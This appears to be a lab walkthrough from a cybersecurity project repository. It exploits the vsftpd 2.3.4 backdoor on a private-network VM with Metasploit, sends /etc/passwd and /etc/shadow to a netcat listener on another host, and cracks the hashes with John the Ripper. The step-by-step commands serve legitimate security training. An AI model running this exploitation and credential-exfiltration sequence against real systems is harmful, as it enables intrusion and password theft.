
--Step 1: VM Startup & Recon 

---


![Spinup](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/Spinupvm.png)


--ip a (check IP)

![verifyIP](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/verify%20ips.png)

--nmap -sS -sV -0 192.168.27.4

![nmap](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/nmapscan.png)

--Step 2:  Exploitation


--msfconsole 

![msfconsole](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/msfconsole.png)


--use exploit/unix/ftp/vsftpd_234_backdoor

--set RHOSTS 192.168.27.4

--run

![runPayload](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/runpayload.png)


--Step 3: File Extraction




--nc -lvnp 9001 > passwd

--nc -lvnp 9002 > shadow

--cat /etc/passwd | nc 192.168.27.5 9001

--cat /etc/shadow | nc 192.168.27.5 9002

![extract](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/extractfiles.png)



--Step 4: Password Cracking

--john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt shadow
![John](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/johnrun.png)

--john -show shadow

![johnshow](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/johnshow.png)
